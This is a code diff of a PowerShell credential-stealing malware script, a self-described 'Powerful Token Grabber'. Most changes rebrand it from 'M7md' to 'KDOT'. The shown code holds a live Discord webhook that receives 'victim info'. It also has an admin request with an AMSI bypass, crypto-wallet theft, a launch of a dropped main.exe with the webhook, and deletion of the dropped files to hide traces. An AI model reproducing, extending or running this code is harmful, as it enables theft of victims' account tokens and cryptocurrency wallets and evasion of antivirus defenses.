@@ -23,7 +23,7 @@ function KDMUTEX {
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 $webhook = "https://discordapp.com/api/webhooks/1216874827927916634/p8cd-3Hhap06Cj2PEDOggXRgb9IRMXQF_93c0HY2oEzzDyKXhH7hzwV6g0OOSf8sIDIp"
-$avatar = "https://cdn.discordapp.com/avatars/791145016080859166/e49052fda3789c06fe0ea121e52acd59.png?size=1024"
+$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
 
 
 # Request admin with AMSI bypass
@@ -680,24 +680,24 @@ function Backup-Data {
     Invoke-Crypto_Wallets
 
     $embed_and_body = @{
-        "username" = "M7md"
+        "username" = "KDOT"
         "content" = "@everyone"
-        "title" = "M7md"
-        "description" = "Created By M7md"
+        "title" = "KDOT"
+        "description" = "Powerful Token Grabber"
         "color" = "3447003"
         "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-        "url" = "https://discord.gg/SCF"
+        "url" = "https://discord.gg/vk3rBhcj2y"
         "embeds" = @(
             @{
-                "title" = "M7md Grabber"
-                "url" = "https://discord.gg/scf"
+                "title" = "POWERSHELL GRABBER"
+                "url" = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                 "description" = "New victim info collected !"
                 "color" = "3447003"
                 "footer" = @{
-                    "text" = "Made by M7md"
+                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                 }
                 "thumbnail" = @{
-                    "url" = "https://cdn.discordapp.com/avatars/791145016080859166/e49052fda3789c06fe0ea121e52acd59.png?size=1024"
+                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
                 }
                 "fields" = @(
                     @{
@@ -824,7 +824,6 @@ function Backup-Data {
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
 
-
     $main_temp = "$env:localappdata\temp"
     $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
@@ -859,7 +858,7 @@ function Backup-Data {
 
     Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
-
+    Remove-Item "$main_temp\main.exe" -Force
 }
 
 function Invoke-TASKS {
